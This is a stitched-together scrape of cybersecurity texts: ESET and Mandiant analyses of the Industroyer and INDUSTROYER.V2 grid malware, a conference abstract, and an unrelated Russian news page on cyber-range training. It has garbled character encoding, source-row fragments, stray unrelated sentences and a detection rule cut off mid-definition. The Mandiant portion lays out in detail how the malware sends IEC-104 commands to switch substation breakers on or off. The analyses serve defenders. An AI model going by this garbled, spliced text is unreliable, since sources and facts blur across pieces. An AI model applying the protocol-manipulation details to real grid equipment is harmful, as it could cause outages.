This second image is also nice to show. As you may notice, this is the source code of the file Overall.exe (reported by researchers), while being debugged. Also, some of the victim folders we named in this report are shown as part of the sources.

Exfiltrated screenshot showing one of the attacker’s machine. Some internal paths were shown in that screenshot.

For the account TstVM we choose this screenshot. In this case, attackers were developing a tool they use to tunnel victim communications. It can be seen (redacted) how source code reveals external IP addresses used by them, as some internal ones, naming for machines that we have not redacted and even passwords.

Analysis of these machines also revealed the usage of the application AdvOr, used for tunneling communications through TOR.

Attribution

In this case, attributing the attack to a specific country is not an easy task. Any of the involved countries or aligned groups could be responsible, as some victims were aligned with Russia, and others were aligned with Ukraine.

What is clear is that the principal motive of the attack was surveillance and data gathering. The attackers used different layers of protection, had an extensive toolset for their victims, and the attack was clearly targeted at specific entities. Perhaps in the future, further events or additional activity from the group can shed light on the matter.

 Update (July 17th): The authors of the Industroyer research, Anton Cherepanov andÂ Robert Lipovsky, will present their findings atÂ Black Hat USA in Las Vegas onÂ July 26th, 2017. More information can be found here. The 2016 attack on Ukraineâs power grid that deprived part of its capital, Kiev, of power for an hour was caused by a cyberattack. ESET researchers have since analyzed samples of malware, detected by ESET as Win32/Industroyer, capable of performing exactly that type of attack. Whether the same malware was really involved in what cybersecurity experts consider to have been a large-scale test is yet to be confirmed. Regardless, the malware is capable of doing significant harm to electric power systems and could also be refitted to target other types of critical infrastructure.  Industroyer is a particularly dangerous threat, since it is capable of controlling electricity substation switches and circuit breakers directly. To do so, it uses industrial communication protocols used worldwide in power supply infrastructure, transportation control systems, and other critical infrastructure systems (such as water and gas). These switches and circuit breakers are digital equivalents of analogue switches; technically they can be engineered to perform various functions. Thus, the potential impact may range from simply turning off power distribution, cascading failures and more serious damage to equipment. The severity may also vary from one substation to another, as well. Needless to say, disruption of such systems can directly or indirectly affect the functioning of vital services. 


Win32/Industroyer: A new threat for industrial control systems

Read full report




 Win32/Industroyer: A new threat for industrial control systems Industroyerâs dangerousness lies in the fact that it uses protocols in the way they were designed to be used. The problem is that these protocols were designed decades ago, and back then industrial systems were meant to be isolated from the outside world. Thus, their communication protocols were not designed with security in mind. That means that the attackers didnât need to be looking for protocol vulnerabilities; all they needed was to teach the malware âto speakâ those protocols. The recent power outage occurred on December 17th, 2016, almost exactly one year after the well-documented cyberattack that caused a blackout that affected around 250,000 households in several regions in Ukraine on December 23rd, 2015. In 2015, the perpetrators infiltrated the electricity distribution networks with the BlackEnergy malware, along with KillDisk and other malicious components, and then abused legitimate remote access software to control operatorsâ workstations and to cut off power. Aside from targeting the Ukrainian power grid, there are no apparent similarities in code between BlackEnergy and Industroyer. Industroyer is modular malware. Its core component is a backdoor used by attackers to manage the attack: it installs and controls the other components and connects to a remote server to receive commands and to report to the attackers. What sets Industroyer apart from other malware targeting infrastructure is its use of four payload components, which are designed to gain direct control of switches and circuit breakers at an electricity distribution substation. Each of these components targets particular communication protocols specified in the following standards: IEC 60870-5-101, IEC 60870-5-104, IEC 61850, and OLE for Process Control Data Access (OPC DA). Generally, the payloads work in stages whose goals are mapping the network, and then figuring out and issuing commands that will work with the specific industrial control devices. Industroyerâs payloads show the authorsâ deep knowledge and understanding of industrial control systems.  The malware contains a few more features that are designed to enable it to remain under the radar, to ensure the malwareâs persistence, and to wipe all traces of itself after it has done its job. For example, the communication with the C&C servers hidden in Tor can be limited to non-working hours. Also, it employs an additional backdoor - masquerading as the Notepad application - designed to regain access to the targeted network in case the main backdoor is detected and/or disabled. And its wiper module is designed to erase system-crucial Registry keys and overwrite files to make the system unbootable and the recovery harder. Of interest is the port scanner that maps the network, trying to find relevant computers: the attackers made their own custom tool instead of using existing software. Finally, yet another module is a Denial-of-Service tool that exploits the CVE-2015-5374 vulnerability in Siemens SIPROTEC devices and can render targeted devices unresponsive. Industroyer is highly customizable malware. While being universal, in that it can be used to attack any industrial control system using some of the targeted communication protocols, some of the components in analyzed samples were designed to target particular hardware. For example, the wiper component and one of the payload components are tailored for use against systems incorporating certain industrial power control products by ABB, and the DoS component works specifically against Siemens SIPROTECT devices used in electrical substations and other related fields of application. While in principle itâs difficult to attribute attacks to malware without performing an onsite incident response, itâs highly probable that Industroyer was used in the December 2016 attack on the Ukrainian power grid. On top of the fact that the malware clearly possesses the unique capabilities to perform the attack, it contains an activation timestamp for December 17th, 2016, the day of the power outage. The 2016 attack on the Ukrainian power grid attracted much less attention than the attack that occurred a year earlier. However, the tool most likely used, Win32/Industroyer, is an advanced piece of malware in the hands of a sophisticated and determined attacker. Thanks to its ability to persist in the system and provide valuable information for tuning-up the highly configurable payloads, attackers could adapt the malware to any environment, which makes it extremely dangerous. Regardless of whether or not the recent attack on the Ukrainian power grid was a test, it should serve as a wake-up call for those responsible for security of critical systems around the world.

Learn morearrow_forward Start for Free   On April 12, 2022, CERT-UA and ESET reported that a cyber physical attack impacted operational technology (OT) supporting power grid operations in Ukraine. The attack leveraged different pieces of malware including a variant of INDUSTROYER, a well-known piece of attack-oriented ICS malware originally deployed in December 2016 to cause power outages in Ukraine.  The attack is significant not only because OT-targeted attacks are rare, but also because this is the first instance in which code from broadly known attack-oriented OT malware was redeployed against a new victim. Despite five years of substantial analysis into INDUSTROYER from a variety of researchers, the actor still attempted to repurpose the tool and customized it to reach new targets. INDUSTROYER.V2 (Mandiantâs name for the new variant) reinforces the notion that OT malware can be tailored for use against multiple victims, which has serious implications for other publicly known OT malware families like INCONTROLLER. While much of the story surrounding INDUSTROYER.V2âs deployment is already publicly available, Mandiant further analyzed the malware to share additional insights for defenders and the OT community. In this blog post we document additional technical details of INDUSTROYER.V2 based on our analysis of two different samples. We also provide detection rules to identify related activity. If you need support responding to related activity, please contactÂ Mandiant Consulting. Further analysis of related threatsâincluding additional malware that was deployed alongside INDUSTROYER.V2âis available as part ofÂ Mandiant Advantage Threat Intelligence.Â  INDUSTROYER.V2 is similar to its predecessor, however this variant contains more targeted functionality. Unlike the original INDUSTROYER, which was a framework that leveraged external modules to implement four different OT protocols, this variant is self-contained and only implements the IEC 60870-5-104 (IEC-104) communications protocol. IEC-104 is used for power system monitoring and control over TCP and is mainly implemented in Europe and the Middle East. Most importantly, the new malware variant enables the actor to embed customized configurations that modify the malwareâs behavior to specific intelligent electronic devices (IEDs) (e.g., protection relays, merging units, etc.) within the target environment. The design change to embed custom configurations in INDUSTROYER.V2 reduces the effort required by the actor to reproduce the attack against different victim environments and enables the actor to contain the impact to specific targeted IEDs. To fully understand the implications of the new customization capabilities in INDUSTROYER.V2, we analyzed and compared two different samples. The second sample, which is likely a recompiled version, is publicly available and in online malware scanning platforms (MD5: 7c05da2e4612fca213430b6c93e76b06).  Based on the slight differences between both samples, we can infer additional details about the scale of the attack, the likely level of access that the actor had within the victim networks, and the reconnaissance likely performed by the attacker prior to the deployment of the malware. Extensible frameworks, such as the original INDUSTROYER and INCONTROLLER, are often preferred by threat actors due to the flexibility of their modular design, allowing deployment of specific payloads to target different victim assets or communication protocols. However, in the case of INDUSTROYER.V2, the actor reimplemented only one of the original components from the earlier framework and created a new self-contained executable. It is unclear why the threat actor made the particular modifications to INDUSTROYER.V2. Perhaps the actor wanted to develop a more streamlined version to target a very specific environment, or they did not want to expose more valuable or capable tools, or they simply believed this approach would be efficient since it would not require additional resources to impact the target. Regardless of the motivations, the reuse of code from known OT malware highlights the value of hunting and detections based on known indicators. For instance, some detections we built for the original INDUSTROYER successfully identified INDUSTROYER.V2 in the wild. While it is often believed that OT malware is not likely to be utilized in more than one environment, tools that take advantage of insecure by design OT featuresâsuch as INDUSTROYER.V2 doesâcan be employed multiple times to target multiple victims. The OT security community should recognize these tools as frameworks or capabilities, and not merely features of isolated cyber security incidents and one time use tools. INDUSTROYER.V2 is written in C++ and implements the IEC-104 protocol to modify the state of remote terminal units (RTUs) over TCP. IEC-104 protocol TCP clients are called control stations and the TCP servers are called remote stations. The malware crafts configurable IEC-104 Application Service Data Unit (ASDU) messages, also known as telegrams, to change the state of a remote stationâs Information Object Addresses (IOAs) to ON or OFF. IOAs identify a specific data element on a device and may correspond to power line switches or circuit breakers in an RTU or relay configuration.Â  The malware is a self-contained executable where the operator can set up configuration parameters to target specific remote stations, define execution options, and craft ASDU messages. It also accepts the optional command line arguments (-o) to print debug messages to an output file or (-t) to create a time delay before execution.  After the command line interface arguments are parsed, INDUSTROYER.V2 iterates through embedded configuration entries. The execution of the program is highly configurable. Based on our analysis of two INDUSTROYER.V2 samples, the malware contains configuration entries structured as strings in the order shown in Table 1. Position Configuration Entry Description 1 Station IP Address 2 Station Port  3 Entry Index Value 4 Enable Hard-Coded Telegrams with specified Range 5 Enable Configuration Options 6 - 14 5b If Entry 4 is Enabled, Telegram Start Range 6 Enable Process Termination  6b If entry 4 is Enabled, Telegram End Range 7 Process Name to Terminate 8 Enable File Rename  9 Directory Path for File Rename  10 Sleep Prior to IEC-104 functionality 11 Sleep Duration Seed Value  12 Execution Control 13 Sleep Duration Seed Value  14 Unused  15 Command State â ON/OFF  16 Change Option â Send Inverted ON/OFF commands 17 Number of ASDU Data Entries  18 First ASDU Data Entry  An example extracted configuration entry from sample 7c05da2e4612fca213430b6c93e76b06 is presented in Figure 2. If configuration entry #4 is enabled, the malware crafts ASDU telegrams to deliver Select and Execute commands and modify the state of a remote station's IOA to OFF. The IOA ranges which these telegrams are sent to are provided by configuration entries #5 and #6. However, this option was not enabled in recovered samples. A configuration mapping against the example in Figure 2 is included in the Appendix.  All the configurations we examined had the following options enabled: process termination, file rename, and use of ASDU data entries. The ASDU data entries are used to craft specific ASDU messages to the remote station and the data entry is structured in the format shown in Table 2. Position ASDU Data Entry Description 1 Station Information Object Address (IOA) 2 Set Message Type â Single or Double Command 3 Set Command Type â Select or Execute 4 Invert Default ON/OFF State  5 Execution Control 6 ASDU Entry Index  After parsing each configuration entry, INDUSTROYER.V2 enumerates running processes to identify if a specific hard-coded process is running and terminates it. Once this process is stopped, the malware enumerates running processes again and terminates whichever process is specified by the operator in the configuration.  If the file rename option is enabled, the malware creates a file path using its configuration data and adds a .MZ extension to this file. This may be a technique to prevent the specified process terminated earlier from relaunching.  For each configuration entry, a thread is created that implements IEC-104 communication with the controlled system. IEC-104 uses the Application Protocol Data Unit (APDU) specification. Â  An APDU frame can be composed of either just an Application Protocol Control Information (APCI) frame; or an APCI header and a subsequent Application Service Data Unit (ASDU) frame. INDUSTROYER.V2 first sends control function messages, which are contained within an APCI frame.Â The first control message is a Test Frame (TESTFR). The malware sends a TESTFR ACT to the remote station which verifies an established connection. If one exists, a remote station responds with a corresponding TESTFR CON. Next, the malware opens a data transfer channel with the remote station using a subsequent control message type of Start Data Transfer (STARTDT). By default, data transfer is not enabled on an active connection between a control station and remote station.Â Therefore, the malware sends a STARTDT ACT to activate a data transfer channel and a remote station sends a corresponding STARTDT CON, to confirm a successful activation.Â Â  With data transfer enabled, the malware utilizes an ASDU frame to send subsequent commands to the remote station. ASDU messages, also known as telegrams, are a set of application functions defined by IEC-104 to monitor and control remote stations. Further information describing the ASDU frame is available for reference here.Â  The malware sends a General Interrogation command, which allows it to obtain the current status of monitored digital and analog signals of the remote station. The malware then uses embedded ASDU data entries to craft a specific command to modify the targetâs IOA to either ON or OFF.  These commands are crafted using options defined within its configuration and the individual ASDU data entry. For example, in the configuration we extracted from sample 7c05da2e4612fca213430b6c93e76b06 (presented in Figure 2) the first ASDU data entry is:  Based on configuration entry 15 (OFF state), entry 16 (Disable Change option), and its ASDU entry values (described in Table 2), the malware crafts an ASDU packet with the following characteristics:  The ASDU message is shown in decoded network traffic in Figure 4. For each targeted remote station in a configuration entry, the malware iterates through corresponding ASDU data entries, crafting specified telegrams, and sends it to the remote station. The malwareâs configuration settings may direct it to craft an additional ASDU message, which inverts the ON/OFF state in a command and sends this additional message to the remote stationâs IOA.  A high-level description of the communication sequence is the following:  Figure 5 illustrates the described message sequence, captured between INDUSTROYER.V2 and a lab emulated IEC-104 remote station. It displays the initial TESTFR, STARTDT, and Interrogation commands, followed by the crafted ASDU commands delivered to specific remote station IOAs. The detailed nature of how a specific remote station is targeted, down to the unique IOAs and the state each IOA must be modified to create an intended effect, demonstrates a comprehensive understanding of, or visibility into the victim environment.  We note that although the IOAs targeted by the malware can provide important context to the actor's precise intent, IOA mappings often differ between manufacturers, devices, and even users. For this reason, accurate interpretation of the actions intended by the actor requires additional knowledge about the targeted assets.  While at this moment we do not have such information, we explored possible IOA matches based on publicly available documentation about specific products. For example, knowing that ABB RTU's and relays areÂ heavilyÂ deployed in the targeted region we performed open source analysis. In our earlier example we observed an IOA equivalent to 1104, which we then mapped to public product documentation from anÂ ABB Distribution Recloser RelayÂ corresponding to ""50BFT:InStr status"". In this status, 50 is the ANSI number for circuit breaker, which is how relay elements are numbered when setting a protection relay. Then 50BFT stands for circuit breaker failure protection. We provide an appendix illustrating additional mapping of IOAsÂ extractedÂ from the configuration of the public INDUSTROYER.V2 sample against the same distribution recloser relay. The two versions of INDUSTROYER contain overlaps in code and similarities in execution flow and functionality. We identified the following shared features in execution and functionality:Â   One difference we identified between both variants is that, unlike its predecessor, INDUSTROYER.V2 contains altered debugging messages which obfuscate the meaning of the outputs. However, we note these debugging messages are formatted and printed at similar execution points of key functions. Further, the obfuscation was not implemented in key portions of IEC-104 code which are reused in both versions, which enables us to visualize the overlaps. Â  For example, both INDUSTROYER versions use very similar code to parse APDU traffic and print specific parsed fields. Figure 6 is a screenshot of INDUSTROYER.V2 on the left and on the right a screenshot of the original INDUSTROYER. Additional notable code overlaps between the two versions exist in implementation of ASDU frame creation, sending of APDU messages, change option execution, and thread setup for IEC-104 functionality. rule MTI_Hunting_INDUSTROYERv2_Bytes { Â Â Â  meta: Â Â Â Â Â Â  Â author = ""Mandiant"" Â Â Â Â Â Â Â  date = ""04-09-2022"" Â Â Â Â Â Â Â  description = ""Searching for executables containing bytecode associated with the INDUSTROYER.V2 malware family.""

Mandiant Blog 1,https://www.eset.com/int/industroyer/,"Breaking news June 12, 2017 On December 17th, the Ukrainian capital Kiev was hit by a blackout. Local investigators later confirmed that the energy outage was caused by a cyberattack. Shortly thereafter, ESETÂ® researchers analyzed a sophisticated new malware, which is the main suspect in this case. They have named it Industroyer â the biggest threat to Industrial Control Systems (ICS) since Stuxnet.  This dangerous malware was developed to exploit weaknesses in those systems and the communication protocols they use â systems developed decades ago with almost no security measures.   Industroyerâs ability to persist in the system and to directly interfere with the operation of industrial hardware makes it the most dangerous malware threat to industrial control systems since the infamous Stuxnet, which successfully attacked Iranâs nuclear program and was discovered in 2010. ESET Senior Malware Researcher, Anton Cherepanov The relatively low impact of December 2016âs blackout stands in great contrast to the technical level and sophistication of the suspected malware behind Industroyer. The possible explanation for this â and the opinion of many security researchers- is that this was a large-scale test. True or not, this (analysis) should be a wake-up call for those responsible for the security of critical infrastructure (systems) worldwide.

Mandiant Blog 1,https://www.virusbulletin.com/conference/vb2018/abstracts/anatomy-attack-detecting-and-defeating-crashoverride/,"Thursday 4 October 15:00 - 15:30, Green room Joe Slowik (Dragos) CRASHOVERRIDE was the first electric-grid-specific targeted malware attack observed in the wild, and only the third (as of its discovery) known destructive ICS malware attack. Since then, multiple discussions have taken place with respect to 'how' this malware (also known as Industroyer) functions, but essentially none have focused on how the entire attack unfolded and may have been detected - or even defeated. This paper and presentation, leveraging new and previously unavailable information from the attack, will demonstrate that there were multiple stages at which the unfolding CRASHOVERRIDE attack could be detected - from initial access through ultimate ICS attack payload delivery - to emphasize even advanced attacker dependency on 'common' exploitation techniques. By examining the attack - essentially providing a dissection - defenders both within and outside of ICS environments can learn how to identify and mitigate even the most dedicated and advanced network attacks by focusing on adversary necessities and dependencies.   Â  Joe Slowik Joe Slowik currently hunts ICS adversaries for Dragos, pursuing threat activity groups through their malware, their communications, and any other observables available. Prior to his time at Dragos, Joe ran the incident response team at Los Alamos National Laboratory, and served as an Information Warfare Officer in the US Navy. Throughout his career in network defence, Joe has consistently worked to 'take the fight to the adversary' by applying forward-looking, active defence measures to constantly keep threat actors off balance. @jfslowik Â  Rowland Yu (Sophos)

Mandiant Blog 1,https://tadviser.com/index.php/Project:Cyber_%E2%80%8B_%E2%80%8B_police_of_Russia_for_information_security_training,"Moscow; State and social structures Kaspersky Lab solutions will be used to counter cyber attacks during the International Cyber â â Championship on Information Security. This was announced on June 1, 2023 by Rostelecom-Solar (formerly Solar Security).
 The organizers invited cybersecurity specialists from several dozen countries from different continents to the upcoming competitions. 40 teams will take part in the main stage of the international cyber championship.
 To repel attacks simulated within the framework of the Cyber â â Championship, Kaspersky Lab provided participants with comprehensive protection tools and conducted training on working with complex incidents. We are talking primarily about a class security system SIEM for centralized collection, analysis and correlation of information security events. Kaspersky Unified Monitoring and Analysis Platform It includes the TI-platform Kaspersky CyberTrace, which is supplemented by various threads about data threats from Kaspersky Lab.
 The institutions St. Petersburg tested the capabilities of the National Cyber â â Police to train cyber defense skills. This was announced on December 8, 2022 by the press service of the vice-governor of St. Petersburg.
 Representatives of departments and institutions of St. Petersburg and the Nizhny Novgorod region took part in cyber training. Activities were carried out to assess the effectiveness of cyber training as a tool to increase the cyber resistance of regional information systems. The results of the implemented projects carried out by RTK-Solar specialists will form the basis of new programs for training and training employees of regional institutions and departments in cyber defense skills at the National Cyber â â Police.
 To recreate the most realistic conditions on cyber exercises, experts from the National Cyber â â Police deployed a digital twin of a typical office infrastructure, which included an email service, web services, databases and a user segment. When developing a scenario for cyber training, the organizers took into account the current landscape of cyber threats characteristic of the public sector. So, according to the Solar JSOC Cyber â â Attack Countermeasures Center, in the third quarter of 2022, a clear trend was formed to move from typical incidents and mass scans to more complex point attacks.
 During cyber exercises, information security specialists of institutions and departments of St. Petersburg and the Nizhny Novgorod region practiced practical skills in monitoring and responding to targeted computer attacks. Working in teams, participants jointly identified automated attack chains using a domestic information security event monitoring system. Experts have analyzed in detail the training scenario of attacks and vectors of intruders entering the organization's infrastructure.
 According to the results of cyber exercises, the participants noted the usefulness of practical training in the conditions of cyber polygon, which is a digital copy of the infrastructure of a real enterprise. The teams demonstrated different levels of competence in responding to cyber attacks. Since the results were uneven, RTK-Solar experts came to the conclusion that it was necessary to introduce several training and training tracks for specialists with different levels of initial training in the field of cybersecurity. The implementation of this approach will help increase the level of security of regional IT resources and the readiness of cybersecurity services of institutions and departments for cyber attacks.
 The company RTK-Solar"""" Russian and the developer-solutions IT"""" Diasoft completed project the development of infrastructure banking segment of the National Cyber â â Police designed to train practical skills of protection against the cyber attacks financial sector organizations. This was announced on August 31, 2022 by Diasoft. More. here
 In Russia, international cyber training was held to prevent an emergency as a result of hacker attacks. This was announced on June 20, 2022 by Rostelecom-Solar. Representatives of six countries took part in large-scale exercises: Russia, Belarus, Kazakhstan, Azerbaijan, Pakistan and Vietnam. The exercises were carried out jointly with the Ministry of Digital Development of the Russian Federation with the support of the Office of the Security Council of the Russian Federation.
 The event was aimed at coordinating efforts to combat hackers at the world level and practically practicing information exchange between the participating countries about attacks carried out from the infrastructure of another state. To conduct international cyber exercises, specialists from the National Cyber â â Police deployed a digital twin of the infrastructure of the energy facility and developed automated attack scenarios that repeated the actions of real attackers recorded from the beginning of the special operation and aimed at various Russian organizations. Participants in cyber exercises in practice worked out interaction to counter highly professional hacker groups aimed at destabilizing the socio-economic situation by carrying out attacks that entail an emergency.
 During the cyber exercises, the participants were divided into teams and had to jointly protect the segments of infrastructure allocated to them from a series of destructive cyber attacks, the purpose of which was to entail a large-scale blackout. According to the legend of the exercises, the hacker group carried out a series of coordinated attacks on a large electric power facility.
 According to the conditions of the exercises, by the time the teams began to work, several significant incidents had already occurred, as a result of which the infrastructure of the energy facility was infected. harmful software
 Attackers continued to conduct attacks for distribution computer virus in order to gain complete control over the attacked object. Participants in cyber exercises were required to investigate the incidents that occurred, clean the infrastructure from malicious activity and prevent re-infection, as well as restore the damaged. files Teams used a range of domestic tools cyber security Kaspersky Unified Monitoring and Analysis Platform (KUMA) to investigate attacks, including a centralized event collection and correlation system, an orchestration, automation INFORMATION SECURITY and incident response platform, R-Vision SOAR a threat intelligence platform R-Vision TIP , and others.
 Since cyber attacks were carried out on each of the infrastructure segments at different times, teams needed to share information about incident investigations. To coordinate the actions of the teams, a special technical unit worked - the Computer Incident Response Center. It was presented by experts from the National Coordination Center for Computer Incidents (NCCCI) and cybersecurity specialists from RTK-Solar. The center's team aggregated team reports, monitored the progress of the incident investigation and informed participants with a certain frequency about threats and recommended measures to counter cyber attacks. The response center was located at the St. Petersburg State University of Telecommunications named after Prof. M. A. Bonch-Bruevich, who acted as a partner in cyber training.
 On May 5, 2022, Rostelecom-Solar announced that the support center of the National Cyber â â Poligon had opened at Orenburg State University (OSU). This is a training platform where students and IT professionals train to repel realistic cyber attacks without endangering the infrastructure of organizations. Read more here.
 At the Volga State University of Telecommunications and Informatics, the support center of the National Cyber â â Poligon began to work. The main goal of the project is to provide practical-oriented training for information security personnel. This was announced on March 4, 2022 by the Roste lecom-Solar company. Read more here.
 In mid-February 2022, the subordinate Ministry of Digital Development Russia St. Petersburg University of Telecommunications named after Professor M.A. Bonch-Bruevich launched a cyber police to train protection against. cyber attacks More. here
 In mid-October 2021, commercial companies were able to connect to the national cyber police in order to train to repel hacker attacks.
 The first such company, according to the Deputy Prime Minister of the Russian Federation, Dmitry Chernyshenko was the Competence Center "" NTI Technologies for the Transportation of Electricity and Distributed Smart Power Systems"" on the basis, Moscow Energy Institute (MPEI) whose cyber polygon is designed to conduct cyber exercises for organizations in the electric power industry. Its connection to the industrial segment of the national cyber police will create a single infrastructure that simulates the typical structure of organizations of the fuel and energy complex.
 According to Chernyshenko, integration will significantly expand technological capabilities and allow conducting larger-scale exercises with the maximum realism of the processes under study. Combining attack scenarios and their reflection on a single site will form a list of threats that Russian enterprises may face. Such experience will be useful for strengthening the information security of individual companies and for expanding the general base of the national cyber police, he added.
 In turn, the director of the NTI Competence Center on the basis of MPEI, Alexander Voloshin, said that ""modern technologies and the comprehensive digitalization of enterprises in the energy industry, together with their undoubted advantages, pose new, comparable challenges and risks, the timely and adequate analysis of which will allow them to level or even completely avoid.""
 Rostelecom-Solar on October 12, 2021 announced that, together with the Corporate University, TMK2U organized large-scale cross-industry corporate exercises at the National Cyber â Rostelecom-Solar Polygon for employees of the Pipe Metallurgical Company (TMK) and the Sinar Group. These are cyber exercises that cover the development of all key processes of information security services - from analyzing the security and building an integrated infrastructure security system to identifying and repelling hacker attacks.
 On the first day of cyber training, the teams were supposed to conduct the most complete inventory of the infrastructure specially created on the basis of the industrial segment of the cyber police. Then they had to search for vulnerabilities in it and configure event sources in the SIEM system. At this stage, the completeness and accuracy of the data from each team was evaluated.
 On the second day, the teams resisted targeted attacks, and at this stage the speed of detecting the incident and responding to it became a key indicator. As a result of each attack, teams provided reports describing both the attacker's chain of steps and the measures necessary to avoid a repeat of the incident.
 On the final day of cyber training, general results were summed up, as well as a detailed analysis of scenarios for training cyber attacks and team actions.
 Under the auspices of the Ministry of Energy of Russia, cyber exercises were held at the National Cyber â â Police of Rostelecom, in which key players in the electric power industry, representatives of law enforcement agencies, regulators and government agencies took part. This was announced on June 25, 2021 by the Roste lecom-Solar company.
 The goal of cyber training is to increase the practical readiness of organizations in the fuel and energy sector to repel complex distributed computer attacks on the entire industry, including the level of interaction and the speed of response.
 Cyber training included a practical and staff unit. The practical part was carried out at the National Cyber Rostelecom-Solar, created by Rostelecom on the basis of the resources of the Rostelecom-Solar subsidiary. Key companies of the electric power industry of Russia, including EuroSibEnergo JSC, Inter RAO PJSC, Rosseti PJSC, RusHydro PJSC, Grid Company JSC, SO UES JSC, Fortum PJSC, as well as representatives of other subjects of the critical information infrastructure of the energy industry.
 According to the scenario of the exercises, in order to destabilize the socio-economic situation, the hacker group carried out a series of coordinated computer attacks on the energy supply infrastructure of the fictional region. The region's electricity grids were divided into seven districts, with a separate team responsible for protecting each. All attack scenarios were developed by Rostelecom-Solar experts specifically for these exercises and were based on real attack cases against companies in the electricity industry. The task of the teams was to identify attacks on the region's IT infrastructure and maintain the observability and manageability of the power grid areas in the area of â â responsibility.
 In parallel, the teams worked as an industry coordination center, which included representatives of the NKCKI and the Ministry of Energy of Russia, as well as Rostelecom specialists who have the skills to respond to computer attacks, taking into account industry specifics. The Coordination Center analyzed information about incidents received from teams and informed participants about threats, as well as recommended measures to counter and eliminate incidents.
 During the headquarters of the exercises, the participants considered the consequences of the attacks that the teams encountered, assessed the sufficiency of standard plans to eliminate the emergency in the context of a fan shutdown of the region's substations, and also developed priority measures to localize the consequences of cyber attacks and prevent them in the future.
 On June 3, 2021, Rostelecom announced the opening of a large-scale program on the basis of the National Cyber â â Police to find vulnerabilities in software and hardware (bug bounty). Its purpose is to verify and increase the level of security of solutions used in public sector organizations, major commercial companies and at critical information infrastructure facilities in Russia. The program was launched as part of the implementation of the Federal Project ""Information Security"" of the National Program ""Digital Economy of the Russian Federation.""
 The first participant in the program was one of the key Russian manufacturers of cryptographic information protection tools - the Security Code company. Vulnerability studies of software and hardware solutions at the National Cyber â â Police will be carried out on a regular basis in cooperation with Russian and foreign developers. By the end of 2021, Rostelecom plans to conclude at least 6 partnerships in this area.
 As part of the bug bounty, researchers will test proposed solutions for resistance to different types of cyber attacks. All information collected based on the results of the programs will be transmitted to vendors to eliminate errors. Thus, the largest Russian developers will be able to check the security of their products in conditions as close as possible to the situation of real cyber attacks, and cybersecurity experts will be able to receive a reward for finding errors and vulnerabilities. This program will help in practice verify the security of solutions that are widely used in key sectors of the economy and thereby increase the country's cyber stability in the digital space.
 The first study starts in June 2021. Its object will be the solution ""Continent AP"" of the company ""Security Code"" - a means of cryptographic information protection, which provides secure access to the corporate network from remote personal computers and smartphones of employees. ""Continent AP"" is used to protect state information systems and objects of the critical information structure of Russia.
 During the first bug bounty program at the National Cyber â â Police, researchers will need to gain remote access to the Continent encryption hardware and software complex and look for vulnerabilities in the implementation of product functionality within three weeks. They will be verified by the expert group of Rostelecom-Solar, a subsidiary of Rostelecom. All information will be transferred to the vendor to improve the security of the solution.
 Rostelecom has opened a support center for the National Cyber â â Polygon based on SibGUTI in Novosibirsk. This was announced on May 17, 2021 by Rostelecom-Solar. Read more here.

 On December 22, 2020, Rostelecom announced the conclusion of an agreement with Kaspersky Lab, under which the software of the Russian manufacturer of antivirus solutions will be used to create the infrastructure of the national cyber police.
 We are talking about a platform that simulates the business processes of enterprises from key sectors of the economy, with the aim of practical training of cybersecurity specialists. Cyber â â polygon will receive several interconnected segments representing IT and industrial infrastructures. Kaspersky Lab B2B solutions such as Kaspersky Anti Targeted Attack Platform, Kaspersky Endpoint Security and Kaspersky Security for Internet gateways will be used to create segments of the first category.
 Corporate solutions Kaspersky Industrial CyberSecurity for Networks, an industrial network traffic analyzer, and Kaspersky Industrial CyberSecurity for Nodes, a comprehensive solution for protecting workplaces and engineering stations in automated process control systems (APCS), will be introduced into the industrial infrastructure of the cyber police.
 It is expected that the infrastructure for financial institutions will include banking and processing systems, industrial infrastructure - relay protection and automation systems, transient monitoring, dispatch control, etc. Participants in cyber exercises will face various types of attacks, the actions of internal and external violators.
 Kaspersky Lab noted that the creation of a cyber police, which will work out various types of attacks, will be a significant contribution to the development of the cybersecurity industry. Within the framework of the project, it will also be possible to test reliable protective solutions, the company emphasized.
 In early December 2020, it became known about the decision of the Ministry of Digital Development to extend until 2024 the implementation of the project to create a cyber police in Russia. Initially, it was planned to be carried out by 2021, however, as the department said in the project with changes to the government decree, more time is needed, since it will be necessary to create infrastructure segments for conducting cyber exercises not only for the banking and energy industries, but also for telecommunications, transport, oil, etc.
 As told To the businessman"""" in the press service of the Ministry of Digital Development, in December 2020, the cyber police will be put into trial operation, and for 2021-2024. the sectoral and functional development of its infrastructure is outlined.
 According to Mikhail Klimov, Development Director of the National Cyber â â Poligon direction of Rostelecom-Solar, two segments created for the credit and financial sector and the energy industry will be put into trial operation by the end of 2020.
 The cyber police will consist of four support centers in the regions that will connect to the operator's infrastructure. The state subsidy for the project for 2019-2020 amounted to 364.55 million rubles, for 2021-2024 it is planned to allocate 600 million rubles.

In such a model, even a small fintech startup can deploy a payment platform and provide services to customers without spending significant financial and technical resources on buying a proprietary solution or developing its own.
 The company Diasoft"","" a Russian developer of solutions IT for the financial sector, entered into an agreement with """" represented Rostelecom by a subsidiary Rostelecom-Solar of "","" a national one. provider cyber security The goal of the cooperation is to build a cyberpoligon banking segment that will provide banks with the opportunity to practice practical reflection skills. cyber attacks Diasoft announced this on September 3, 2020.
 Cyber â â Poligon is one of the information security projects implemented within the framework of the National Program ""Digital Economy of Russia"" in 2020. The task of creating it is entrusted to Rostelecom, the project is being implemented with the involvement of expertise from its subsidiary Rostelecom-Solar. Cyber â â polygon includes a number of segments that repeat the typical infrastructure of organizations in various industries, including the credit and financial sector.
 In order for the cyber training of the security services to be as close as possible to the real conditions, the virtual infrastructure of the cyber police must include the entire set of information systems of banks - ABS and related components. The corresponding solution of Diasoft, which is used by credit and financial institutions of Russia, was chosen as an automated banking system.
 According to Diasoft experts, in the process of automation of banking activities there are many points of interaction between different systems, which inevitably leads to the emergence of vulnerabilities. Therefore, the company enthusiastically met the initiative of Rostelecom aimed at improving the security of the financial sector in the country.
 In addition to conducting cyber exercises, the virtual infrastructure of the cyber police will be used to conduct stress tests of Russian solutions used in complex projects to ensure the information security of banks.
 In the future, three more support centers for cyber policing in the regions - in the Far East, in the Volga and Southern Federal Districts - will be connected to Rostelecom's digital platform, which will increase the level of protection of all key sectors of the country's economy.
 In December 2019, Rostelecom won a competition to create a cyber police for training and training information security specialists. For the implementation of this project, the state operator will receive about 364.55 million rubles from the budget of the Russian Federation, TASS reports with reference to the protocol of the competition commission. The document is posted on the website of the Ministry of Communications.

